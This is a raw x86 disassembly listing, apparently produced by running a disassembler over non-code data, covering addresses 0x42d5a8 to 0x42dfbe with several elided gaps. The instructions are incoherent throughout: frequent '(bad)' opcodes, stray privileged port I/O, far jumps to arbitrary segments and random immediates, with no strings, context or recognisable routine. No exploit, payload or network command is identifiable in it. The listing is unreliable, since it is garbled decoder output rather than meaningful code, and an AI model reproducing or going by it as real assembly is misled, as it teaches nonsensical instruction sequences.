  42d5a8:	and    DWORD PTR [ebp+0x67],eax
  42d5ab:	pop    ss
  42d5ac:	push   cs
  42d5ad:	(bad)  
  42d5ae:	adc    BYTE PTR [eax+0x17aa845a],dl
  42d5b4:	push   eax
  42d5b5:	jge    0x42d558
  42d5b7:	or     al,0xff
  42d5b9:	sbb    al,0x5
  42d5bb:	push   edx
  42d5bc:	sbb    BYTE PTR [edx],cl
  42d5be:	aas    
  42d5bf:	popf   
  42d5c0:	add    BYTE PTR ds:[edx-0x7b],0xe1
  42d5c5:	jg     0x42d580
  42d5c7:	(bad)  
  42d5c9:	or     al,BYTE PTR [ebx]
  42d5cb:	cmp    al,0x95
  42d5cd:	or     edx,eax
  42d5cf:	push   0x7e
  42d5d1:	int    0xca
  42d5d3:	dec    esp
  42d5d4:	fdivr  st,st(7)
  42d5d6:	rol    DWORD PTR [ecx+0x4c9aa6bc],0x89
  42d5dd:	das    
  42d5de:	xchg   esi,eax
  42d5df:	cmp    BYTE PTR [ecx+0x8],ah
  42d5e2:	test   DWORD PTR [eax-0x42],ebx
  42d5e5:	loopne 0x42d664
  42d5e7:	sahf   
  42d5e8:	pusha  
  42d5e9:	or     edi,edx
  42d5eb:	mov    ah,0x4b
  42d5ed:	jnp    0x42d5d1
  42d5ef:	dec    esi
  42d5f0:	int    0xf9
  42d5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5f3:	out    dx,eax
  42d5f4:	repz fwait
  42d5f6:	leave  
  42d5f7:	mov    edx,esp
  42d5f9:	mov    bh,0xff
  42d5fb:	ret    0x7617
  42d5fe:	leave  
  42d5ff:	cmp    eax,edi
  42d601:	mov    esp,0x1af3d470
  42d606:	pusha  
  42d607:	div    ch
  42d609:	icebp  
  42d60a:	adc    bh,BYTE PTR [esi]
  42d60c:	neg    DWORD PTR [ebp-0x400d1]
  42d612:	mov    ds:0x3d63d12b,al
  42d617:	in     eax,dx
  42d618:	pop    eax
  42d619:	cmp    eax,0xa98fd0fc
  42d61e:	ja     0x42d65a
  42d620:	mov    bl,0x97
  42d622:	jmp    0xcfd5:0x8f0da29b
  42d629:	std    
  42d62a:	int    0xb6
  42d62c:	sub    bh,al
  42d62e:	xor    esi,edx
  42d630:	mov    esp,0xc5d3b1fa
	...
  42d695:	add    bl,dh
  42d697:	add    esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0xad408d59
  42d6a4:	push   ds
  42d6a5:	imul   ebx,DWORD PTR [ebp-0x1a],0x1070001
  42d6ac:	add    BYTE PTR [eax],al
  42d6ae:	je     0x42d676
  42d6b0:	aam    0xd5
  42d6b2:	mov    cs,WORD PTR [ecx-0xb]
  42d6b5:	scas   al,BYTE PTR es:[edi]
  42d6b6:	aam    0x52
  42d6b8:	sub    esi,DWORD PTR [ebp-0x6322e855]
  42d6be:	test   BYTE PTR ds:0xcc39eea3,0x96
  42d6c5:	push   DWORD PTR [edx]
  42d6c7:	outs   dx,DWORD PTR ds:[esi]
  42d6c8:	arpl   cx,di
  42d6ca:	gs pop edx
  42d6cc:	in     al,0x38
  42d6ce:	or     BYTE PTR [ecx-0x3],bh
  42d6d1:	pop    ecx
  42d6d2:	and    DWORD PTR [ecx],edx
  42d6d4:	inc    esp
  42d6d5:	xor    eax,0x23ed719d
  42d6da:	xchg   edx,eax
  42d6db:	enter  0x9879,0x47
  42d6df:	xchg   edx,eax
  42d6e0:	leave  
  42d6e1:	addr16 ret 
  42d6e3:	xor    BYTE PTR [ebp-0x6b],bl
  42d6e6:	inc    eax
  42d6e7:	fprem  
  42d6e9:	call   0x28fb23c3
  42d6ee:	aad    0x1a
  42d6f0:	cmp    ebx,DWORD PTR [edi]
  42d6f2:	std    
  42d6f3:	push   edi
  42d6f4:	xor    bh,ah
  42d6f6:	and    ch,dl
  42d6f8:	cmp    al,0x8f
  42d6fa:	jno    0x42d6f3
  42d6fc:	sub    al,0xfd
  42d6fe:	iret   
  42d6ff:	out    dx,eax
  42d700:	pop    ebx
  42d701:	sbb    BYTE PTR [ecx-0xe],0x7e
  42d705:	ins    DWORD PTR es:[edi],dx
  42d706:	sbb    BYTE PTR [ebx+0x2f0fed9e],ch
  42d70c:	stos   DWORD PTR es:[edi],eax
  42d70d:	or     dh,BYTE PTR [esp+ecx*4+0x18]
  42d711:	jle    0x42d6ad
  42d713:	and    ecx,DWORD PTR [edi]
  42d715:	mov    esi,0x85419668
  42d71a:	xchg   ecx,eax
  42d71b:	adc    eax,0x124ae662
  42d720:	jl     0x42d6d8
  42d722:	arpl   WORD PTR [edx-0x3b],cx
  42d725:	jne    0x42d75a
  42d727:	xchg   esp,eax
  42d728:	frstor [ebx]
  42d72a:	cmp    DWORD PTR [edi-0xe],0x4a
  42d72e:	and    esi,ebp
  42d730:	sub    eax,0x77f80373
  42d735:	ror    DWORD PTR [edi+0x3f35e776],1
  42d73b:	sbb    bl,dl
  42d73d:	shr    DWORD PTR [ecx],1
  42d73f:	cbw    
  42d741:	jmp    0x92a9:0x8027ccb
  42d748:	dec    ecx
  42d749:	xor    esi,DWORD PTR [ebx-0x69]
  42d74c:	sub    eax,0x68e8eeee
  42d751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d752:	cmovs  edx,DWORD PTR [ebx]
  42d755:	lahf   
  42d756:	out    dx,al
  42d757:	stos   BYTE PTR es:[edi],al
  42d758:	push   es
  42d759:	imul   edi,DWORD PTR ds:0x13774d92,0xffffffd1
  42d760:	sub    dh,BYTE PTR [ebx-0x2591d6a8]
  42d766:	ret    
  42d767:	inc    edi
  42d768:	test   BYTE PTR ds:0x27c78523,bl
  42d76e:	dec    eax
  42d76f:	inc    eax
  42d770:	push   ebp
  42d771:	xlat   BYTE PTR ds:[ebx]
  42d772:	push   0xd67c067d
  42d777:	inc    ebx
  42d778:	dec    eax
  42d779:	mov    ecx,0xf1ab31d9
  42d77e:	sub    ecx,DWORD PTR [esi+0x640ed78f]
  42d784:	and    al,0x1f
  42d786:	cmp    BYTE PTR [eax+0x295fe815],al
  42d78c:	test   BYTE PTR [ebp+edx*1+0x12],bh
  42d790:	mov    ds:0x2e8d04eb,eax
  42d795:	push   ds
  42d796:	mov    edi,0x460ab17d
  42d79b:	or     esi,DWORD PTR [eax+0x54078c96]
  42d7a1:	div    al
  42d7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7a4:	sbb    bh,BYTE PTR ds:0x95300412
  42d7aa:	mov    edi,cs
  42d7ac:	mov    eax,0x17b7e0c6
  42d7b1:	sbb    ch,dl
  42d7b3:	stc    
  42d7b4:	sti    
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0x512b5795
  42d825:	jg     0x42d88b
  42d827:	out    0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [edi-0x777e7fc0],al
  42d833:	(bad)  
  42d834:	sti    
  42d835:	sub    eax,0x7c3c01d3
  42d83a:	xor    DWORD PTR [ecx-0x12],0xc3708ddc
  42d841:	arpl   WORD PTR [ebp+0x104920da],sp
  42d847:	icebp  
  42d848:	std    
  42d849:	sbb    ecx,DWORD PTR [eax]
  42d84b:	lahf   
  42d84c:	(bad)  
  42d84d:	sbb    eax,0x7298020c
  42d852:	ret    
  42d853:	addr16 push ss
  42d855:	cld    
  42d856:	push   esp
  42d857:	fiadd  WORD PTR [ebx+0x75418616]
  42d85d:	add    BYTE PTR [esi],0x41
  42d860:	(bad)  
  42d861:	addr16 ret 0x8c6d
  42d865:	mov    ebx,0x286ba06e
  42d86a:	mov    edx,ecx
  42d86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d86d:	pop    esp
  42d86e:	xchg   ebp,eax
  42d86f:	or     al,0x55
  42d871:	jp     0x42d82f
  42d873:	out    0xb9,al
  42d875:	bswap  esi
  42d877:	bound  esi,QWORD PTR [edx+0x42]
  42d87a:	das    
  42d87b:	lea    ebp,[ebx+0x3d6e0fae]
  42d881:	gs cli 
  42d883:	pop    ecx
  42d884:	les    ebx,FWORD PTR [ebx+0x2f]
  42d887:	inc    ecx
  42d888:	and    DWORD PTR [esp+edx*4+0x5a],0xa839a592
  42d890:	into   
  42d891:	add    al,BYTE PTR ds:0x17156ae2
  42d897:	jge    0x42d8b5
  42d899:	mov    ds:0x1636218c,al
  42d89e:	fst    QWORD PTR [esi]
  42d8a0:	jnp    0x42d8b1
  42d8a2:	ret    
  42d8a3:	mov    esp,0x4c257ac4
  42d8a8:	retf   
  42d8a9:	sub    ebp,DWORD PTR [ebp-0x5a]
  42d8ac:	mov    ds:0xc238d95a,al
  42d8b1:	pop    edx
  42d8b2:	jo     0x42d8af
  42d8b4:	add    cl,ah
  42d8b6:	ffreep st(7)
  42d8b8:	nop
  42d8b9:	jle    0x42d918
  42d8bb:	inc    esp
  42d8bc:	dec    ebp
  42d8bd:	dec    ebp
  42d8be:	mov    edx,0x2fb5d55f
  42d8c3:	inc    edx
  42d8c4:	xchg   esi,eax
  42d8c5:	out    dx,eax
  42d8c6:	push   ds
  42d8c7:	dec    eax
  42d8c8:	adc    eax,0xdf9731d
  42d8cd:	sub    esp,eax
  42d8cf:	jecxz  0x42d930
  42d8d1:	cmp    eax,0xb534dc3e
  42d8d6:	hlt    
  42d8d7:	xchg   ecx,eax
  42d8d8:	je     0x42d91b
  42d8da:	ins    BYTE PTR es:[edi],dx
  42d8db:	jne    0x42d914
  42d8dd:	mov    eax,DWORD PTR [edx-0x21]
  42d8e0:	into   
  42d8e1:	stc    
  42d8e2:	dec    ecx
  42d8e3:	int    0x5b
  42d8e5:	sbb    dh,al
  42d8e7:	xchg   BYTE PTR [edi],dh
  42d8e9:	out    dx,al
  42d8ea:	pop    eax
  42d8eb:	adc    al,0xe5
  42d8ed:	data16 mov BYTE PTR [esp+edx*2-0x14],dl
  42d8f2:	mov    gs,WORD PTR [eax-0x17]
  42d8f5:	(bad)  
  42d8f6:	das    
  42d8f7:	ins    DWORD PTR es:[edi],dx
  42d8f8:	ja     0x42d93a
  42d8fa:	push   0xc0ab4d54
  42d8ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d900:	dec    eax
  42d901:	sub    DWORD PTR [eax-0x75c8661],ebp
  42d907:	(bad)  
  42d908:	jmp    0xc2:0xb176e71
  42d90f:	loopne 0x42d950
  42d911:	inc    eax
  42d912:	xchg   DWORD PTR [edx],ebx
  42d914:	mov    eax,ds:0x48b57136
  42d919:	pop    edx
  42d91a:	sti    
  42d91b:	xor    edi,DWORD PTR ds:0x7e16ba3
  42d921:	and    ah,BYTE PTR [ebx+0x10]
  42d924:	sub    eax,0xc253f09
  42d929:	sub    DWORD PTR [edi-0x41],ebx
  42d92c:	jne    0x42d97e
  42d92e:	sbb    BYTE PTR [eax],bh
  42d930:	not    DWORD PTR [ebx]
  42d932:	mov    ds,WORD PTR [esi+0x20]
	...
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0xffc84b14,ecx
  42d9a5:	(bad)  
  42d9a6:	imul   ebp,eax,0x1
  42d9a9:	add    BYTE PTR [edi],al
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    dh,cl
  42d9af:	popf   
  42d9b0:	leave  
  42d9b1:	dec    edx
  42d9b2:	xchg   ecx,eax
  42d9b3:	jle    0x42d93e
  42d9b5:	test   DWORD PTR [ebx-0x6b],0x5023875f
  42d9bc:	mov    ebx,ds
  42d9be:	push   ecx
  42d9bf:	jmp    0xe72d:0xac99ca57
  42d9c6:	jl     0x42d94c
  42d9c8:	pop    ebp
  42d9c9:	stos   DWORD PTR es:[edi],eax
  42d9ca:	and    al,0x37
  42d9cc:	mov    edi,0x31297b03
  42d9d1:	repz inc ecx
  42d9d3:	mov    esp,ecx
  42d9d5:	shl    BYTE PTR ds:0xc189bcbd,cl
  42d9db:	jb     0x42d969
  42d9dd:	fwait
  42d9de:	pop    ebp
  42d9df:	or     al,0x4a
  42d9e1:	dec    DWORD PTR [edi-0x31c79ee5]
  42d9e7:	fisub  DWORD PTR [ebx+edi*8]
  42d9ea:	adc    ecx,ebp
  42d9ec:	inc    ecx
  42d9ed:	ja     0x42d992
  42d9ef:	dec    ebp
  42d9f0:	daa    
  42d9f1:	jmp    FWORD PTR [ebx]
  42d9f3:	sub    al,0x85
  42d9f5:	inc    edi
  42d9f6:	sub    DWORD PTR [ebx],0xc98fa9d0
  42d9fc:	jb     0x42d9ca
  42d9fe:	pop    es
  42d9ff:	retf   0xdd49
  42da02:	and    dh,BYTE PTR [edx-0x4]
  42da05:	dec    ebp
  42da06:	ss pop esp
  42da08:	sar    BYTE PTR [ebx],cl
  42da0a:	inc    BYTE PTR [edi]
  42da0c:	or     eax,0x8a1b5a39
  42da11:	adc    al,dl
  42da13:	cs jmp 0x77e0:0xfacd7933
  42da1b:	mov    ah,BYTE PTR ds:0x2d14b8ba
  42da21:	sbb    BYTE PTR [bp+si-0x385c],bl
  42da26:	cld    
  42da27:	xor    DWORD PTR [ebp-0x30282f4f],esp
  42da2d:	(bad)  
  42da2e:	cli    
  42da2f:	ja     0x42d9f9
  42da31:	shl    DWORD PTR [edi],1
  42da33:	or     edi,eax
  42da35:	test   BYTE PTR [ebx-0x5a],cl
  42da38:	cmp    eax,0x4c1b8b79
  42da3d:	jns    0x42da73
  42da3f:	adc    DWORD PTR [esi+0x21],0x8441a37
  42da46:	xchg   edi,eax
  42da47:	xchg   esi,eax
  42da48:	mov    ebx,DWORD PTR [ebx-0x10]
  42da4b:	xor    eax,0x27486556
  42da50:	mov    ebp,ds
  42da52:	lods   eax,DWORD PTR ds:[esi]
  42da53:	aas    
  42da54:	jmp    0xfe64:0xb9bf7813
  42da5b:	xor    BYTE PTR [edi],dl
  42da5d:	aas    
  42da5e:	stos   BYTE PTR es:[edi],al
  42da5f:	inc    ebx
  42da60:	jmp    0x42daba
  42da62:	jl     0x42da45
  42da64:	bound  eax,QWORD PTR [edx+0x78f2ee18]
  42da6a:	sti    
  42da6b:	bound  esp,QWORD PTR [esi+0x49e28c4c]
  42da71:	inc    esi
  42da72:	test   BYTE PTR [ebp-0x3420bebd],cl
  42da78:	xchg   esi,eax
  42da79:	(bad)  
  42da7a:	jmp    0xfb1e:0x743d767b
  42da81:	add    esi,DWORD PTR [eax-0x1c]
  42da84:	mov    esi,0x9a930ff0
  42da89:	pop    eax
  42da8a:	inc    ebx
  42da8b:	jnp    0x42daf3
  42da8d:	mov    WORD PTR [edx-0x770c9ca6],?
  42da93:	sub    bl,BYTE PTR [ecx]
  42da95:	xor    eax,0xc5a843b7
  42da9a:	std    
  42da9b:	jns    0x42db15
  42da9d:	pusha  
  42da9e:	sub    al,0x72
  42daa0:	aad    0x5e
  42daa2:	setle  BYTE PTR [edi+0x2c]
  42daa6:	jle    0x42dabc
  42daa8:	jmp    0x42dac4
  42daaa:	jecxz  0x42dae3
  42daac:	push   esp
  42daad:	push   ebx
  42daae:	xchg   edi,eax
  42daaf:	fsubr  QWORD PTR [ebx-0x2b9f43ab]
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42dadb
  42db23:	pop    eax
  42db24:	icebp  
  42db25:	and    dh,BYTE PTR [edx-0x17]
  42db28:	add    DWORD PTR [eax],eax
  42db2a:	pop    es
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    BYTE PTR ds:0xa1eecab0,dl
  42db33:	and    BYTE PTR [eax+0x54],0xb6
  42db37:	or     eax,0xbe590cb
  42db3c:	lahf   
  42db3d:	out    dx,al
  42db3e:	push   ebp
  42db3f:	jg     0x42dba3
  42db41:	mov    ss,WORD PTR [ebx-0x47ece973]
  42db47:	pop    esi
  42db48:	mov    ds:0xd6c28e9c,eax
  42db4d:	shr    bl,0xe0
  42db50:	pop    esi
  42db51:	out    0xb5,al
  42db53:	xlat   BYTE PTR ds:[ebx]
  42db54:	mov    esi,0xc7d273c2
  42db59:	mov    ebx,0xa8c1fb7
  42db5e:	or     al,0xc1
  42db60:	dec    esp
  42db61:	repz leave 
  42db63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db64:	leave  
  42db65:	call   0x6232:0x179268ca
  42db6c:	jle    0x42db17
  42db6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db6f:	rcr    DWORD PTR [edi-0x16be7a77],1
  42db75:	stos   BYTE PTR es:[edi],al
  42db76:	jno    0x42dbe3
  42db78:	fbld   TBYTE PTR [esp+eax*8]
  42db7b:	loopne 0x42db41
  42db7d:	ss ss push esp
  42db80:	adc    al,0xb5
  42db82:	fistp  WORD PTR [edx-0x3edb92c2]
  42db88:	push   edi
  42db89:	xor    dh,BYTE PTR [ecx]
  42db8b:	pusha  
  42db8c:	dec    eax
  42db8d:	test   al,0x2b
  42db8f:	jo     0x42db44
  42db91:	mov    cl,0x5f
  42db93:	sub    dh,BYTE PTR [edi-0x66]
  42db96:	xchg   ebx,eax
  42db97:	mov    cl,0x46
  42db99:	sbb    dh,BYTE PTR [esi]
  42db9b:	jo     0x42dbb4
  42db9d:	icebp  
  42db9e:	ret    
  42db9f:	cmc    
  42dba0:	xchg   edx,eax
  42dba1:	xchg   edx,eax
  42dba2:	(bad)  
  42dba4:	jp     0x42db64
  42dba6:	vpshlb ymm13,xmm7,xmm7
  42dbab:	push   edx
  42dbac:	outs   dx,BYTE PTR ds:[esi]
  42dbad:	loopne 0x42dc05
  42dbaf:	sbb    DWORD PTR [ebp-0x78ff60a9],esi
  42dbb5:	adc    ah,BYTE PTR [edi-0x3]
  42dbb8:	push   eax
  42dbb9:	sub    esp,esp
  42dbbb:	popa   
  42dbbc:	pop    es
  42dbbd:	jmp    0x42dbf3
  42dbbf:	ror    ebp,0xba
  42dbc2:	pop    es
  42dbc3:	cli    
  42dbc4:	sub    ah,dh
  42dbc6:	rcl    dh,1
  42dbc8:	scas   eax,DWORD PTR es:[edi]
  42dbc9:	or     ecx,ebx
  42dbcb:	mov    bh,0x20
  42dbcd:	enter  0x3929,0xea
  42dbd1:	inc    ebp
  42dbd2:	xchg   edi,eax
  42dbd3:	pusha  
  42dbd4:	sahf   
  42dbd5:	(bad)  
  42dbd6:	push   esp
  42dbd7:	dec    ebx
  42dbd8:	cli    
  42dbd9:	jg     0x42dc26
  42dbdb:	imul   edi,DWORD PTR [edx],0x24
  42dbde:	cmc    
  42dbdf:	jg     0x42dbee
  42dbe1:	inc    ebx
  42dbe2:	xchg   BYTE PTR ds:0xaf94fdb6,ch
  42dbe8:	and    al,0x5d
  42dbea:	add    edi,DWORD PTR [edi-0x27]
  42dbed:	pop    esi
  42dbee:	sahf   
  42dbef:	add    dl,BYTE PTR [esi+0x4316ae71]
  42dbf5:	popa   
  42dbf6:	retf   0xb7
  42dbf9:	xchg   esp,eax
  42dbfa:	mov    ebp,0x5b653ef8
  42dbff:	arpl   WORD PTR [ecx-0x724b4a2d],dx
  42dc05:	sbb    edx,DWORD PTR [ebx-0x14d611e6]
  42dc0b:	xor    BYTE PTR [ebx],ah
  42dc0d:	xchg   ecx,eax
  42dc0e:	cmp    DWORD PTR [eax-0x6c],esi
  42dc11:	fstp   QWORD PTR [ebp-0x77]
  42dc14:	in     al,dx
  42dc15:	mov    bl,0x17
  42dc17:	imul   edi,DWORD PTR [ecx+0xdf6a6d3],0xb7dcaf9e
  42dc21:	mov    WORD PTR ds:0xdb6c6d94,fs
  42dc27:	sub    ah,BYTE PTR ds:0x6921a2ef
  42dc2d:	or     eax,0x44284034
  42dc32:	push   esi
  42dc33:	jmp    0x0:0x0
	...
  42dc96:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x9e1ef285
  42dca4:	and    eax,0x1ea79fe
  42dca9:	add    BYTE PTR [edi],al
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [eax+0x557e9fe5],bl
  42dcb3:	jle    0x42dcbf
  42dcb5:	mov    ebp,DWORD PTR [edi-0x57]
  42dcb8:	xchg   esi,eax
  42dcb9:	mov    ds:0x8a41b0a4,eax
  42dcbe:	int    0xdd
  42dcc0:	jmp    0x42dc50
  42dcc2:	pop    es
  42dcc3:	rcr    DWORD PTR [esi+0x2819b90b],1
  42dcc9:	adc    eax,edi
  42dccb:	mov    eax,ds:0x17b210c5
  42dcd0:	and    ch,BYTE PTR [ecx-0x7e]
  42dcd3:	xor    BYTE PTR [eax],cl
  42dcd5:	add    edx,DWORD PTR [eax]
  42dcd7:	clc    
  42dcd8:	sub    eax,0xb74e418e
  42dcdd:	stc    
  42dcde:	push   cs
  42dcdf:	adc    edi,DWORD PTR [edi+eiz*8-0x16]
  42dce3:	fstp   st(0)
  42dce5:	out    0x45,eax
  42dce7:	dec    edx
  42dce8:	daa    
  42dce9:	fwait
  42dcea:	leave  
  42dceb:	xor    eax,0x9ee23ab5
  42dcf0:	push   eax
  42dcf1:	fcmovbe st,st(2)
  42dcf3:	xchg   ecx,eax
  42dcf4:	inc    esp
  42dcf5:	mov    ds:0xb9fd759d,al
  42dcfa:	sub    bh,BYTE PTR [eax]
  42dcfc:	push   esp
  42dcfd:	outs   dx,BYTE PTR ds:[esi]
  42dcfe:	and    ah,BYTE PTR [eax+0x5741b42b]
  42dd04:	adc    al,0x2f
  42dd06:	mov    ah,0xc0
  42dd08:	mov    bl,0xdd
  42dd0a:	push   esp
  42dd0b:	xchg   ebx,eax
  42dd0c:	or     DWORD PTR [ebp+0x7e902964],eax
  42dd12:	lock pcmpgtb mm7,QWORD PTR [esi]
  42dd16:	push   eax
  42dd17:	and    ebx,DWORD PTR [esp+eax*2]
  42dd1a:	in     al,0xf
  42dd1c:	cmp    eax,0xaf1e79b0
  42dd21:	jb     0x42dd0d
  42dd23:	cmovns ebp,ecx
  42dd26:	ficomp WORD PTR [eax-0x6a]
  42dd29:	inc    edi
  42dd2a:	mov    edi,0x6856dc86
  42dd2f:	rcl    ecx,0x47
  42dd32:	out    dx,eax
  42dd33:	or     edi,0xe99bce62
  42dd39:	jmp    0x965e6bbd
  42dd3e:	(bad)  
  42dd3f:	mov    bh,0x79
  42dd41:	xchg   edi,eax
  42dd42:	out    dx,eax
  42dd43:	mov    ebp,0xb1db3da2
  42dd48:	add    eax,0x2fc1e7e5
  42dd4d:	mov    edx,0x85e27963
  42dd52:	sub    al,0xf5
  42dd54:	add    al,0x8e
  42dd56:	dec    esp
  42dd57:	cmp    ah,BYTE PTR [ebx-0x5bf4c0dd]
  42dd5d:	pop    edx
  42dd5e:	ds jge 0x42dda2
  42dd61:	(bad)  
  42dd62:	lock dec eax
  42dd64:	int    0xcd
  42dd66:	push   ebp
  42dd67:	test   al,0xed
  42dd69:	into   
  42dd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd6b:	sbb    eax,0xb6671215
  42dd70:	mov    eax,0x170d8fa3
  42dd75:	aas    
  42dd76:	icebp  
  42dd77:	ins    BYTE PTR es:[edi],dx
  42dd78:	mov    dl,0x0
  42dd7a:	enter  0x7e39,0x41
  42dd7e:	in     al,dx
  42dd7f:	mov    ah,0xbb
  42dd81:	add    edi,edi
  42dd83:	pop    ebp
  42dd84:	daa    
  42dd85:	push   es
  42dd86:	pop    edi
  42dd87:	fscale 
  42dd89:	jl     0x42dd28
  42dd8b:	fisttp DWORD PTR [esi+0x35]
  42dd8e:	cwde   
  42dd8f:	add    al,cl
  42dd91:	push   edi
  42dd92:	rcr    bl,0xbd
  42dd95:	lods   eax,DWORD PTR ds:[esi]
  42dd96:	dec    ebx
  42dd97:	js     0x42dd55
  42dd99:	(bad)  
  42dd9a:	jo     0x42dd54
  42dd9c:	add    eax,0x908d100d
  42dda1:	jmp    0xd48380ac
  42dda6:	cmp    DWORD PTR [edx+0x7e],ecx
  42dda9:	add    eax,0xa49e565b
  42ddae:	repz sti 
  42ddb0:	ds jmp 0x0:0x1ad44f
	...
  42de14:	add    BYTE PTR [eax],al
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x600f5807
  42de25:	mov    BYTE PTR [eax+0x70001eb],0x1
  42de2c:	add    BYTE PTR [eax],al
  42de2e:	imul   esi,DWORD PTR [esi+eiz*8+0x4c],0x3f
  42de33:	xor    BYTE PTR [edx+0x6d],bl
  42de36:	and    ecx,0x35
  42de39:	pop    ebp
  42de3a:	popf   
  42de3b:	adc    edx,DWORD PTR [eax]
  42de3d:	xlat   BYTE PTR ds:[ebx]
  42de3e:	hlt    
  42de3f:	out    0xa,al
  42de41:	jno    0x42de5d
  42de43:	(bad)  
  42de44:	retf   
  42de45:	mov    al,ds:0x7fba58f
  42de4a:	dec    edx
  42de4b:	xchg   DWORD PTR [eax+0x988ca5c],eax
  42de51:	les    ecx,FWORD PTR [ebx+0x18]
  42de54:	js     0x42de41
  42de56:	mov    eax,ds:0x54d067f9
  42de5b:	ss jb  0x42de53
  42de5e:	adc    al,0x39
  42de60:	imul   esi,DWORD PTR [eax-0x5e],0xf463fca8
  42de67:	int3   
  42de68:	inc    DWORD PTR [eax-0x60786029]
  42de6e:	fcomip st,st(6)
  42de70:	in     al,dx
  42de71:	outs   dx,BYTE PTR ds:[esi]
  42de72:	sbb    al,BYTE PTR [ebx+esi*8+0x556b53bb]
  42de79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de7a:	es stos BYTE PTR es:[edi],al
  42de7c:	jg     0x42de4a
  42de7e:	jae    0x42dee9
  42de80:	push   0xe1130e6b
  42de85:	add    al,0x7f
  42de87:	aas    
  42de88:	jae    0x42de30
  42de8a:	cli    
  42de8b:	ds das 
  42de8d:	cmc    
  42de8e:	cmp    edx,DWORD PTR [eax+0x26aaef64]
  42de94:	pop    eax
  42de95:	inc    edx
  42de96:	xchg   BYTE PTR [esi+ebp*8],ch
  42de99:	sub    bh,BYTE PTR [edx]
  42de9b:	ins    DWORD PTR es:[edi],dx
  42de9c:	(bad)  
  42de9d:	push   0xffffffc0
  42de9f:	mov    bh,0xb3
  42dea1:	xor    al,0x9d
  42dea3:	mov    bh,0x18
  42dea5:	dec    eax
  42dea6:	pop    esi
  42dea7:	dec    ebx
  42dea8:	add    eax,0xfb5f77d1
  42dead:	into   
  42deae:	xchg   edi,eax
  42deaf:	and    al,0xac
  42deb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42deb2:	sub    edx,ebx
  42deb4:	aas    
  42deb5:	adc    ecx,DWORD PTR [eax+ecx*2-0x77d6cc53]
  42debc:	jecxz  0x42dee5
  42debe:	mov    ebx,0xcad0b156
  42dec3:	ror    BYTE PTR [ebx],1
  42dec5:	sbb    eax,0x3336bd0
  42deca:	loop   0x42dead
  42decc:	sub    al,0xb1
  42dece:	or     ebx,esi
  42ded0:	dec    edx
  42ded1:	sbb    al,0x76
  42ded3:	add    eax,0x15840334
  42ded8:	push   eax
  42ded9:	sub    BYTE PTR es:[ecx+ecx*4-0x57],dl
  42dede:	test   eax,0xa55834e1
  42dee3:	shl    edi,0xe5
  42dee6:	(bad)  
  42dee7:	cmp    ebp,edx
  42dee9:	sbb    DWORD PTR [ecx+0x5d],esp
  42deec:	clc    
  42deed:	sub    al,0x6e
  42deef:	test   al,0xb2
  42def1:	xchg   ebp,eax
  42def2:	adc    ah,dl
  42def4:	arpl   WORD PTR [esi],si
  42def6:	call   0xdcc9:0x8130b184
  42defd:	inc    eax
  42defe:	in     al,0xb7
  42df00:	retf   
  42df01:	and    edi,DWORD PTR [ecx-0x1e]
  42df04:	cmp    eax,0xa80c1987
  42df09:	sub    BYTE PTR [eax],bl
  42df0b:	adc    BYTE PTR [edx],ch
  42df0d:	cmc    
  42df0e:	imul   eax,DWORD PTR [edi+0x3949e917],0x44a17d61
  42df18:	out    dx,eax
  42df19:	mov    edx,esi
  42df1b:	sub    ecx,DWORD PTR [ebp-0x64bd399]
  42df21:	cmp    eax,0x83ad7116
  42df26:	test   DWORD PTR [esp+eiz*8-0x25bd89db],ebp
  42df2d:	mov    ah,0x20
  42df2f:	mov    bh,0xfa
  42df31:	mov    WORD PTR [edi],ss
  42df33:	add    al,0xde
	...
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	or     ecx,0x29
  42dfa5:	jns    0x42df2e
  42dfa7:	in     al,dx
  42dfa8:	add    DWORD PTR [eax],eax
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [edx-0xc475727],dh
  42dfb3:	push   ebx
  42dfb4:	loope  0x42df59
  42dfb6:	mov    ds:0xb12d946f,eax
  42dfbb:	retf   
  42dfbc:	or     edx,DWORD PTR [esi]
  42dfbe:	dec    esi
